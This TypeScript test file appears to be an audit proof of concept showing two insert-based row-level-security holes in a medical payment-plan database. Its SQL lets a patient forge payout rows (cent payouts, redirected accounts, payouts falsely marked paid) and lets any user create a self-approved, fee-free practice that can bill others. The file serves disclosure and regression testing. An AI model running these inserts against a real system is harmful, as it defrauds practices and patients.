// @vitest-environment node
//
// ─── Audit round three: two INSERT-shaped holes ───────────────────────────
//
// PROOF-OF-CONCEPT. Every assertion below demonstrates that an attack
// SUCCEEDS against the schema as it stands. They are written to pass while
// the defects are open. When the defects are fixed, these tests must be
// INVERTED (expect the insert to be rejected), not deleted — the inverted
// form is the regression test.
//
// Both findings are about INSERT. Rounds one and two closed the UPDATE
// surface thoroughly — protect_plans_write, protect_payments_write,
// protect_profiles_columns, protect_practices_columns — and every one of
// those either fires only on UPDATE or was paired with an INSERT branch.
// Two tables were left with a permissive INSERT policy and no trigger at
// all, and on those two tables INSERT is the whole attack.
//
//   R3-01  payouts    — a patient may INSERT the payout row for their own
//                       plan. payouts.plan_id is UNIQUE and the only
//                       legitimate creator upserts with ignoreDuplicates,
//                       so the forged row WINS and the real one no-ops.
//                       The patient therefore sets net_amount, practice_id,
//                       status and the banking snapshot for a real payout.
//
//   R3-02  practices  — any authenticated user may INSERT a practice with
//                       owner_id = self. protect_practices_columns pins
//                       status/fee_percent/approved_at/approved_by, but it
//                       is a BEFORE UPDATE trigger, so at INSERT time
//                       status='approved' is simply accepted. Adding an
//                       own membership with role='provider' then satisfies
//                       practice_can_trade() and the practice can bill.
//
// FIDELITY: the policies, triggers and constraints below are transcribed
// verbatim from the LIVE database (pg_policies / pg_get_functiondef /
// pg_get_constraintdef on project wcwuqpyjiexkvnilceko, read 2026-09-01,
// with migrations 0001–0134 applied). They are not a paraphrase of what
// the migrations were meant to do.
//
// Runs as a real non-superuser `authenticated` role. pglite's default role
// bypasses RLS, which would make this file pass with every policy deleted.

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { PGlite } from '@electric-sql/pglite';

const PATIENT   = '0000aaaa-0000-0000-0000-00000000aaaa';
const OUTSIDER  = '0000bbbb-0000-0000-0000-00000000bbbb';
const GROUP     = '0000c000-0000-0000-0000-00000000c000';
const PRACTICE  = '0000dddd-0000-0000-0000-00000000dddd';
const PLAN      = '0000eeee-0000-0000-0000-00000000eeee';

const SCHEMA = `
  create role anon          nologin;
  create role authenticated nologin;
  create role service_role  nologin bypassrls;

  create table _ctx (uid uuid, role text);
  insert into _ctx values (null, 'authenticated');
  create schema if not exists auth;
  create or replace function auth.uid()  returns uuid
    language sql stable as $$ select uid  from _ctx limit 1 $$;
  create or replace function auth.role() returns text
    language sql stable as $$ select role from _ctx limit 1 $$;

  create table profiles (
    id uuid primary key,
    role text,
    approved_credit_limit numeric
  );

  create table practice_groups (id uuid primary key, name text);

  create table practices (
    id uuid primary key default gen_random_uuid(),
    owner_id uuid,
    name text not null,
    specialty text not null,
    email text not null,
    group_id uuid not null references practice_groups(id),
    status text default 'pending',
    fee_percent numeric default 6.00,
    approved_at timestamptz,
    approved_by uuid,
    bank_name text,
    bank_account_number text,
    branch_code text,
    account_holder text,
    account_type text,
    constraint practices_status_check
      check (status = any (array['pending','approved','suspended','inactive'])),
    constraint practices_account_type_check
      check (account_type = any (array['current','savings']))
  );

  create table practice_members (
    id uuid primary key default gen_random_uuid(),
    practice_id uuid,
    user_id uuid,
    role text,
    active boolean default true,
    can_create_bills boolean default false,
    can_manage_practice boolean not null default false,
    provider_first_name text,
    provider_last_name text,
    constraint practice_members_role_check
      check (role = any (array['admin','staff','provider'])),
    constraint practice_members_identifiable check (
      ((user_id is not null) and (provider_first_name is null) and (provider_last_name is null))
      or ((user_id is null) and (provider_first_name is not null) and (btrim(provider_first_name) <> '')
          and (provider_last_name is not null) and (btrim(provider_last_name) <> ''))
    ),
    constraint practice_members_practice_id_user_id_key unique (practice_id, user_id)
  );

  create table plans (
    id uuid primary key,
    patient_id uuid,
    practice_id uuid,
    total_amount numeric,
    status text
  );

  create table payouts (
    id uuid primary key default gen_random_uuid(),
    practice_id uuid,
    plan_id uuid,
    gross_amount numeric not null,
    fee_amount numeric not null,
    net_amount numeric not null,
    status text default 'pending',
    paid_at timestamptz,
    created_at timestamptz default now(),
    provider_id uuid,
    payout_destination text default 'practice',
    snapshot_bank_name text,
    snapshot_account_holder text,
    snapshot_account_number text,
    snapshot_branch_code text,
    snapshot_account_type text,
    batch_id uuid,
    constraint payouts_plan_id_unique unique (plan_id),
    constraint payouts_status_check
      check (status = any (array['pending','processing','paid','failed'])),
    constraint payouts_payout_destination_check
      check (payout_destination = any (array['practice','provider']))
  );

  grant usage  on schema auth, public to anon, authenticated, service_role;
  grant select on _ctx                to anon, authenticated, service_role;
  grant execute on function auth.uid(), auth.role()
                                      to anon, authenticated, service_role;
  grant select, insert, update, delete on all tables in schema public
                                      to anon, authenticated, service_role;

  -- ── The live helper functions (0021 / 0043 / 0126) ──────────────────
  create or replace function is_platform_admin() returns boolean
    language sql stable security definer set search_path = public as $$
      select exists (select 1 from profiles where id = auth.uid() and role = 'admin');
    $$;

  create or replace function is_practice_member(p_practice_id uuid) returns boolean
    language sql stable security definer set search_path = public as $$
      select exists (
        select 1 from practice_members
         where practice_id = p_practice_id and user_id = auth.uid() and active = true
      );
    $$;

  create or replace function practice_can_trade(p_practice_id uuid) returns boolean
    language sql stable security definer set search_path = public as $$
      select
        exists (select 1 from practices where id = p_practice_id and status = 'approved')
        and exists (
          select 1 from practice_members
           where practice_id = p_practice_id and active = true and role = 'provider'
        );
    $$;

  create or replace function hnpl_write_is_privileged() returns boolean
    language sql stable set search_path = public as $$
      select coalesce(auth.role() = 'service_role', false)
          or coalesce(current_setting('app.privileged_write', true) = 'on', false);
    $$;

  -- ── The live trigger: BEFORE UPDATE ONLY. This is R3-02. ────────────
  create or replace function protect_practices_columns() returns trigger
    language plpgsql security definer set search_path = public as $$
    begin
      if auth.role() = 'service_role'
         or current_setting('app.privileged_write', true) = 'on' then
        return new;
      end if;
      if new.status is distinct from old.status then
        raise exception 'practices.status is set only by an admin action';
      end if;
      if new.fee_percent is distinct from old.fee_percent then
        raise exception 'practices.fee_percent is set only by changePracticeFeePercent';
      end if;
      if new.approved_at is distinct from old.approved_at then
        raise exception 'practices.approved_at is set only by approvePractice';
      end if;
      if new.approved_by is distinct from old.approved_by then
        raise exception 'practices.approved_by is set only by approvePractice';
      end if;
      return new;
    end;
    $$;
  drop trigger if exists trg_protect_practices_columns on practices;
  create trigger trg_protect_practices_columns
    before update on practices for each row
    execute function protect_practices_columns();

  alter table profiles         enable row level security;
  alter table practices        enable row level security;
  alter table practice_members enable row level security;
  alter table plans            enable row level security;
  alter table payouts          enable row level security;
  alter table practice_groups  enable row level security;

  -- ── Live policies, transcribed ──────────────────────────────────────
  create policy "users_select_own_profile" on profiles
    for select using (id = auth.uid());

  -- practices: the INSERT policy at the heart of R3-02
  create policy "authenticated_insert_practice" on practices
    for insert with check ((auth.uid() is not null) and (owner_id = auth.uid()));
  create policy "owners_select_own_practice" on practices
    for select using (owner_id = auth.uid());
  create policy "practice_members_select_own_practice" on practices
    for select using (is_practice_member(id));
  -- the read that leaks a usable group_id to any billed patient
  create policy "patients_select_practice_for_own_plans" on practices
    for select using (exists (
      select 1 from plans
       where plans.practice_id = practices.id and plans.patient_id = auth.uid()
    ));

  create policy "owners_insert_own_membership" on practice_members
    for insert with check (exists (
      select 1 from practices
       where practices.id = practice_members.practice_id and practices.owner_id = auth.uid()
    ));
  create policy "members_select_own_membership" on practice_members
    for select using (user_id = auth.uid());

  create policy "patients_select_own_plans" on plans
    for select using (patient_id = auth.uid());
  create policy "practice_members_insert_plans" on plans
    for insert with check (is_practice_member(practice_id) and practice_can_trade(practice_id));

  -- payouts: the INSERT policy at the heart of R3-01 (migration 0009)
  create policy "patients_insert_payout_on_accept" on payouts
    for insert with check (exists (
      select 1 from plans
       where plans.id = payouts.plan_id and plans.patient_id = auth.uid()
    ));
  create policy "provider_select_own_payouts" on payouts
    for select using (provider_id = auth.uid());
`;

const SEED = `
  insert into profiles (id, role, approved_credit_limit) values
    ('${PATIENT}',  'patient', 5000),
    ('${OUTSIDER}', 'patient', 5000);

  insert into practice_groups (id, name) values ('${GROUP}', 'Real Group');

  -- A genuine, admin-approved practice that raised a genuine bill.
  insert into practices (id, owner_id, name, specialty, email, group_id, status,
                         bank_name, bank_account_number, branch_code,
                         account_holder, account_type)
  values ('${PRACTICE}', null, 'Real Practice', 'Dentist', 'real@x.co',
          '${GROUP}', 'approved', 'FNB', '62000000001', '250655',
          'Real Practice', 'current');

  insert into plans (id, patient_id, practice_id, total_amount, status)
  values ('${PLAN}', '${PATIENT}', '${PRACTICE}', 10000, 'pending_first_payment');
`;

let db: PGlite;

async function as<T>(uid: string, sql: string): Promise<T[]> {
  await db.exec(`update _ctx set uid = '${uid}', role = 'authenticated';`);
  await db.exec('set role authenticated;');
  try {
    return (await db.query(sql)).rows as T[];
  } finally {
    await db.exec('reset role;');
  }
}

beforeAll(async () => {
  db = new PGlite();
  await db.exec(SCHEMA);
  await db.exec(SEED);
}, 60_000);

afterAll(async () => { await db?.close(); });

// ─────────────────────────────────────────────────────────────────────────
// R3-01 — the patient forges the payout row for their own plan
// ─────────────────────────────────────────────────────────────────────────

describe('R3-01 — payouts has a patient INSERT policy and no write trigger', () => {
  it('a patient can INSERT the payout row for their own plan', async () => {
    await as(PATIENT, `
      insert into payouts (plan_id, practice_id, gross_amount, fee_amount, net_amount)
      values ('${PLAN}', '${PRACTICE}', 10000, 600, 9400);
    `);
    const rows = await db.query<{ n: number }>(
      `select count(*)::int as n from payouts where plan_id = '${PLAN}';`);
    expect(rows.rows[0].n).toBe(1);
  });

  it('the forged row WINS: the legitimate ON CONFLICT DO NOTHING upsert no-ops', async () => {
    // Exactly what lib/payments/activateFirstInstalment.ts issues, as
    // service_role, when the first instalment clears.
    await db.exec(`
      insert into payouts (plan_id, practice_id, gross_amount, fee_amount, net_amount,
                           status, payout_destination)
      values ('${PLAN}', '${PRACTICE}', 10000, 600, 9400, 'pending', 'practice')
      on conflict (plan_id) do nothing;
    `);
    const rows = await db.query<{ n: number }>(
      `select count(*)::int as n from payouts where plan_id = '${PLAN}';`);
    expect(rows.rows[0].n).toBe(1);   // still the patient's row
  });

  it('every payout-defining column is patient-controlled', async () => {
    await db.exec(`delete from payouts where plan_id = '${PLAN}';`);
    // net_amount reduced to a cent, routed to a practice_id the patient
    // names, with the patient's own bank details snapshotted onto it.
    await as(PATIENT, `
      insert into payouts (
        plan_id, practice_id, gross_amount, fee_amount, net_amount,
        status, payout_destination, provider_id,
        snapshot_bank_name, snapshot_account_holder, snapshot_account_number,
        snapshot_branch_code, snapshot_account_type
      ) values (
        '${PLAN}', '${OUTSIDER}', 10000, 9999.99, 0.01,
        'pending', 'provider', '${PATIENT}',
        'Capitec', 'A Patient', '1234567890', '470010', 'savings'
      );
    `);
    const row = (await db.query<{
      net_amount: string; practice_id: string; snapshot_account_number: string;
    }>(`select net_amount, practice_id, snapshot_account_number
          from payouts where plan_id = '${PLAN}';`)).rows[0];

    expect(Number(row.net_amount)).toBe(0.01);          // practice paid a cent
    expect(row.practice_id).toBe(OUTSIDER);             // routed elsewhere
    expect(row.snapshot_account_number).toBe('1234567890');
  });

  it('the patient can also mark the payout already settled', async () => {
    await db.exec(`delete from payouts where plan_id = '${PLAN}';`);
    await as(PATIENT, `
      insert into payouts (plan_id, practice_id, gross_amount, fee_amount,
                           net_amount, status, paid_at)
      values ('${PLAN}', '${PRACTICE}', 10000, 600, 9400, 'paid', now());
    `);
    const row = (await db.query<{ status: string }>(
      `select status from payouts where plan_id = '${PLAN}';`)).rows[0];
    // status='paid' is excluded from the weekly batch runner's
    // `.eq('status','pending')` sweep, so the practice is never paid at all.
    expect(row.status).toBe('paid');
  });
});

// ─────────────────────────────────────────────────────────────────────────
// R3-02 — any authenticated user creates a self-approved trading practice
// ─────────────────────────────────────────────────────────────────────────

describe('R3-02 — practices.status is unguarded at INSERT', () => {
  it('a patient can read a usable group_id off the practice that billed them', async () => {
    const rows = await as<{ group_id: string }>(PATIENT,
      `select group_id from practices where id = '${PRACTICE}';`);
    expect(rows).toHaveLength(1);
    expect(rows[0].group_id).toBe(GROUP);
  });

  it('a patient can INSERT a practice that is already status=approved', async () => {
    await as(PATIENT, `
      insert into practices (id, owner_id, name, specialty, email, group_id,
                             status, fee_percent, approved_at, approved_by,
                             bank_name, bank_account_number, branch_code,
                             account_holder, account_type)
      values ('0000f00f-0000-0000-0000-00000000f00f', '${PATIENT}',
              'Totally Legit Dental', 'Dentist', 'evil@x.co', '${GROUP}',
              'approved', 0, now(), '${PATIENT}',
              'Capitec', '1234567890', '470010', 'A Patient', 'savings');
    `);
    const row = (await db.query<{ status: string; fee_percent: string }>(
      `select status, fee_percent from practices
        where id = '0000f00f-0000-0000-0000-00000000f00f';`)).rows[0];
    expect(row.status).toBe('approved');       // never touched by an admin
    expect(Number(row.fee_percent)).toBe(0);   // and it keeps 100% of the bill
  });

  it('the owner can then grant themselves an active provider membership', async () => {
    await as(PATIENT, `
      insert into practice_members (practice_id, user_id, role, active,
                                    can_create_bills, can_manage_practice)
      values ('0000f00f-0000-0000-0000-00000000f00f', '${PATIENT}',
              'provider', true, true, true);
    `);
    const rows = await as<{ role: string }>(PATIENT,
      `select role from practice_members where user_id = '${PATIENT}';`);
    expect(rows[0].role).toBe('provider');
  });

  it('practice_can_trade() now returns TRUE for the forged practice', async () => {
    const rows = await as<{ can: boolean }>(PATIENT,
      `select practice_can_trade('0000f00f-0000-0000-0000-00000000f00f') as can;`);
    expect(rows[0].can).toBe(true);
  });

  it('and it can raise a bill — the RLS trading gate is satisfied', async () => {
    await as(PATIENT, `
      insert into plans (id, patient_id, practice_id, total_amount, status)
      values ('0000ffff-0000-0000-0000-00000000ffff', '${OUTSIDER}',
              '0000f00f-0000-0000-0000-00000000f00f', 49999, 'pending_acceptance');
    `);
    const rows = await db.query<{ n: number }>(
      `select count(*)::int as n from plans
        where practice_id = '0000f00f-0000-0000-0000-00000000f00f';`);
    expect(rows.rows[0].n).toBe(1);
  });
});
